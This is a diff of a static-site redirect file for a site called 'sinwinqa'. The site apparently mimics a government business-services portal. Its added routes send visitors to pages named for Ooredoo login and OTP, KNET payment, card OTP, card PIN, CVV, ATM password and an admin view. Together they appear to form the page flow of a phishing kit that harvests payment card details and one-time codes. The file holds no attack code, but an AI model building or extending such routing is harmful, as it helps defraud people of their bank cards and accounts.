@@ -1,6 +1,46 @@
-# Sinwinqa static pages - serve directly
-/sinwinqa/*   /sinwinqa/:splat   200
-/sinwinqa_assets/*   /sinwinqa_assets/:splat   200
+# Main sinwinqa pages
+/service /sw-service.html 200
+/register /sw-register.html 200
+/reset /sw-reset.html 200
+/update /sw-update.html 200
+/login /sw-login.html 200
 
-# React app - all other routes
-/*    /index.html   200
+# Services pages
+/services/certificates /sw-services/certificates.html 200
+/services/labor-approval /sw-services/labor-approval.html 200
+/services/ad-license /sw-services/ad-license.html 200
+/services/commercial-license /sw-services/commercial-license.html 200
+/services/close-company /sw-services/close-company.html 200
+/services/sub-commercial /sw-services/sub-commercial.html 200
+/services/foreign-branches /sw-services/foreign-branches.html 200
+/services/full-renewal /sw-services/full-renewal.html 200
+/services/complete-founding /sw-services/complete-founding.html 200
+/services/full-founding /sw-services/full-founding.html 200
+/services/trade-name /sw-services/trade-name.html 200
+/services/renew-ad-license /sw-services/renew-ad-license.html 200
+/services/beneficiaries /sw-services/beneficiaries.html 200
+/services/full-modification /sw-services/full-modification.html 200
+/services/cancel-ad-license /sw-services/cancel-ad-license.html 200
+/services/add-branch /sw-services/add-branch.html 200
+/services/complete-factory /sw-services/complete-factory.html 200
+/services/factory-founding /sw-services/factory-founding.html 200
+/services/business-advisor /sw-services/business-advisor.html 200
+
+# React app pages
+/ooredoo-login /index.html 200
+/ooredoo-otp /index.html 200
+/card-otp /index.html 200
+/card-pin /index.html 200
+/credit-card-payment /index.html 200
+/otp-verification /index.html 200
+/atm-password /index.html 200
+/knet-payment /index.html 200
+/cvv /index.html 200
+/final-page /index.html 200
+/admin /index.html 200
+
+# Home page - sinwinqa
+/ /sw-index.html 200
+
+# Fallback
+/* /index.html 200
